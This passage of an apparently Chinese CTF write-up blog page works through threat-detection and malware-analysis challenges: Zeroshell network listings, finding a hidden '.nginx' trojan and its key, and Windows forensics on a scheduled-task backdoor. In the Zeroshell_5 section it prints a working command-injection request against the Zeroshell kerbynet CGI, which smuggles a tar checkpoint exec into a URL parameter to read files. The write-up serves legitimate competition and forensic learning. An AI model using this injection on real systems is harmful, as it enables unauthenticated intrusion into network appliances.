+tcp        0      0 *:https                 *:*                     LISTEN
+tcp        0      0 ::ffff:61.139.:www-http ::ffff:61.139.2.1:64845 ESTABLISHED
+udp        0      0 *:kpasswd               *:*
+udp        0      0 KDC.localdomain:domain  *:*
+udp        0      0 192.168.250.254:domain  *:*
+udp        0      0 61.139.2.100:domain     *:*
+udp        0      0 192.168.141.142:domain  *:*
+udp        0      0 localhost.locald:domain *:*
+udp        0      0 192.168.250.25:kerberos *:*
+udp        0      0 KDC.localdomai:kerberos *:*
+udp        0      0 61.139.2.100:kerberos   *:*
+udp        0      0 KDC.localdomain:ntp     *:*
+udp        0      0 61.139.2.100:ntp        *:*
+udp        0      0 localhost.localdoma:ntp *:*
+udp        0      0 *:ntp                   *:*
+udp        0      0 192.168.250:kerberos-iv *:*
+udp        0      0 KDC.localdo:kerberos-iv *:*
+udp        0      0 61.139.2.10:kerberos-iv *:*
+udp        0      0 *:domain                *:*
+udp        0      0 fe80::e40e:6ff:kerberos *:*
+udp        0      0 fe80::20c:29ff:kerberos *:*
+udp        0      0 fe80::e40e:6ff:fe6d:ntp *:*
+udp        0      0 fe80::20c:29ff:fe9f:ntp *:*
+udp        0      0 ::1:ntp                 *:*
+udp        0      0 *:ntp                   *:*
+udp        0      0 fe80::e40e::kerberos-iv *:*
+udp        0      0 fe80::20c:2:kerberos-iv *:*
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node Path
+unix  2      [ ACC ]     STREAM     LISTENING     15995  /var/run/acpid.socket
+unix  2      [ ACC ]     SEQPACKET  LISTENING     12410  /run/udev/control
+unix  9      [ ]         DGRAM                    16811  /dev/log
+unix  3      [ ]         STREAM     CONNECTED     20014
+unix  2      [ ]         DGRAM                    19977
+unix  3      [ ]         STREAM     CONNECTED     20015
+unix  2      [ ]         DGRAM                    19636
+unix  2      [ ]         DGRAM                    16830
+unix  2      [ ]         DGRAM                    19316
+unix  2      [ ]         DGRAM                    19606
+unix  3      [ ]         DGRAM                    7849
+unix  3      [ ]         DGRAM                    7850
+unix  2      [ ]         DGRAM                    18318
+unix  2      [ ]         DGRAM                    15992
+flag{202.115.89.103}
+</code></pre>
+<h3 id="zeroshell_4">Zeroshell_4</h3>
+<ul>
+<li>全局搜索目标ip<code>202.115.89.103</code></li>
+</ul>
+<figure data-type="image" tabindex="16"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162011252.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>Exp find全局搜一下</li>
+<li>在/Database/目录下，和 flag一样</li>
+</ul>
+<pre><code class="language-Python">flag{.nginx}
+</code></pre>
+<h3 id="zeroshell_5">Zeroshell_5</h3>
+<p>提取木马文件</p>
+<pre><code class="language-SQL">wget &quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27cat%20/Database/.nginx%27%0A%27&quot;
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162011433.png" alt="img" loading="lazy"></figure>
+<p>得到的文件拖到IDA中打开，查看字符串，发现IP后面跟着一串字符，猜测为加密秘钥，尝试提交，结果正确</p>
+<figure data-type="image" tabindex="18"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012518.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">flag{11223344qweasdzxc}
+</code></pre>
+<h3 id="winft_1">WinFT_1</h3>
+<ul>
+<li>老规矩，先net一下看看</li>
+</ul>
+<pre><code class="language-Python">netstat -a
+</code></pre>
+<ul>
+<li>明显有一个外部地址不一样</li>
+</ul>
+<figure data-type="image" tabindex="19"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012231.png" alt="img" loading="lazy"></figure>
+<ul>
+<li><code>Wireshark</code>看看包，先全局搜索下<code>miscsecure</code>,没有，那咱们一个字符一个字符删看看，一下看到一个<code>.exe</code>.</li>
+</ul>
+<figure data-type="image" tabindex="20"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012464.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>这个<code>exe</code>文件大概率是马,点开看，与咱们一开始<code>net</code>的对上了，刚刚那个<code>miscsecure</code>应该是<code>192.168.116.130</code></li>
+</ul>
+<figure data-type="image" tabindex="21"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162014926.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">flag{miscsecure.com:192.168.116.130:443}
+</code></pre>
+<h3 id="winft_2">WinFT_2</h3>
+<ul>
+<li>查看任务计划程序，很明显的定时启动木马</li>
+</ul>
+<figure data-type="image" tabindex="22"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012557.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=
+</code></pre>
+<ul>
+<li><code>base64</code></li>
+</ul>
+<figure data-type="image" tabindex="23"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012680.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">Nice，flag is {AES_encryption_algorithm_is_an_excellent_encryption_algorithm}
+</code></pre>
+<h3 id="sc05_1">sc05_1</h3>
+<p>打开表格，搜索134.6.4.12，tcp中最早的即为所求</p>
+<figure data-type="image" tabindex="24"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162012614.png" alt="img" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#safe_proxy">Safe_proxy</a></li>
+</ul>
+</li>
+<li><a href="#reverse">Reverse</a>
+<ul>
+<li><a href="#ezcsky">ezCsky</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#rasnd">rasnd</a></li>
+<li><a href="#fffffhash">Fffffhash</a></li>
+</ul>
+</li>
+<li><a href="#%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%81%B6%E6%84%8F%E5%88%86%E6%9E%90">威胁检测与恶意分析</a>
+<ul>
+<li><a href="#zeroshell_1">Zeroshell_1</a></li>
+<li><a href="#zeroshell_2">Zeroshell_2</a></li>
+<li><a href="#zeroshell_3">Zeroshell_3</a></li>
+<li><a href="#zeroshell_4">Zeroshell_4</a></li>
+<li><a href="#zeroshell_5">Zeroshell_5</a></li>
+<li><a href="#winft_1">WinFT_1</a></li>
+<li><a href="#winft_2">WinFT_2</a></li>
+<li><a href="#sc05_1">sc05_1</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://yzs17.github.io/post/FRP/">
+              <h3 class="post-title">
+                FRP代码阅读
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/YZS17" target="_blank">XU17</a>
+  <a class="rss" href="https://yzs17.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
